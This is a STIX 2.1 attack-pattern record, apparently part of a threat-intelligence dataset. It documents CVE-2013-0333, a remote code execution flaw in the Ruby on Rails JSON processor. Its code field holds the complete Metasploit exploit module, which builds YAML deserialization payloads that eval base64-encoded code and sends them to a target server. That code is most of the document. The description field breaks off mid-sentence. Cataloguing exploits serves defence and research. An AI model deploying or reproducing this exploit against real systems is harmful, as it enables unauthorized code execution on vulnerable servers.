{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e835da7f-e7b2-4f30-8397-b43e746caec5",
    "created": "2024-08-14T17:10:32.150196Z",
    "modified": "2024-08-14T17:10:32.150201Z",
    "name": "Ruby on Rails JSON Processor YAML Deserialization Code Execution",
    "description": " This module exploits a remote code execution vulnerability in the JSON request processor of the Ruby on Rails application framework. This vulnerability allows an attacker to instantiate a remote object which in turn can be used to execute any ruby code remotely in the context of the application. This vulnerability is very similar to",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rails_json_yaml_code_exec.rb",
            "external_id": "rails_json_yaml_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0333"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails JSON Processor YAML Deserialization Code Execution',\n      'Description'    => %q{\n          This module exploits a remote code execution vulnerability in the\n        JSON request processor of the Ruby on Rails application framework.\n        This vulnerability allows an attacker to instantiate a remote object,\n        which in turn can be used to execute any ruby code remotely in the\n        context of the application. This vulnerability is very similar to\n        CVE-2013-0156.\n\n        This module has been tested successfully on RoR 3.0.9, 3.0.19, and\n        2.3.15.\n\n        The technique used by this module requires the target to be running a\n        fairly recent version of Ruby 1.9 (since 2011 or so). Applications\n        using Ruby 1.8 may still be exploitable using the init_with() method,\n        but this has not been demonstrated.\n\n      },\n      'Author'         =>\n        [\n          'jjarmoc',  # Initial module based on cve-2013-0156, testing help\n          'egypt',    # Module\n          'lian',     # Identified the RouteSet::NamedRouteCollection vector\n        ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-0333' ],\n          [ 'OSVDB', '89594' ]\n        ],\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => false,\n      'Targets'        =>\t[ ['Automatic', {} ] ],\n      'DisclosureDate' => '2013-01-28',\n      'DefaultOptions' => { \"PrependFork\" => true },\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', \"/\"]),\n        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST', 'PUT'] ])\n      ])\n\n  end\n\n  #\n  # Create the YAML document that will be embedded into the JSON\n  #\n  def build_yaml_rails2\n\n    code = Rex::Text.encode_base64(payload.encoded)\n    yaml =\n      \"--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\\n\" +\n      \"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; \" +\n      \"eval(%[#{code}].unpack(%[m0])[0]);' \" +\n      \": !ruby/object:ActionController::Routing::Route\\n segments: []\\n requirements:\\n   \" +\n      \":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\\n     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: \" +\n      \":#{Rex::Text.rand_text_alpha(rand(8)+1)}\\n\"\n    yaml.gsub(':', '\\u003a')\n  end\n\n\n  #\n  # Create the YAML document that will be embedded into the JSON\n  #\n  def build_yaml_rails3\n\n    code = Rex::Text.encode_base64(payload.encoded)\n    yaml =\n      \"--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\\n\" +\n      \"'#{Rex::Text.rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);' \" +\n      \": !ruby/object:OpenStruct\\n table:\\n  :defaults: {}\\n\"\n    yaml.gsub(':', '\\u003a')\n  end\n\n  def build_request(v)\n    case v\n    when 2; build_yaml_rails2\n    when 3; build_yaml_rails3\n    end\n  end\n\n  #\n  # Send the actual request\n  #\n  def exploit\n\n    [2, 3].each do |ver|\n      print_status(\"Sending Railsv#{ver} request to #{rhost}:#{rport}...\")\n      send_request_cgi({\n        'uri'     => normalize_uri(target_uri.path),\n        'method'  => datastore['HTTP_METHOD'],\n        'ctype'   => 'application/json',\n        'headers' => { 'X-HTTP-Method-Override' => 'get' },\n        'data'    => build_request(ver)\n      }, 25)\n      handler\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-01-28",
    "x_mitre_platforms": [
        "ruby'"
    ]
}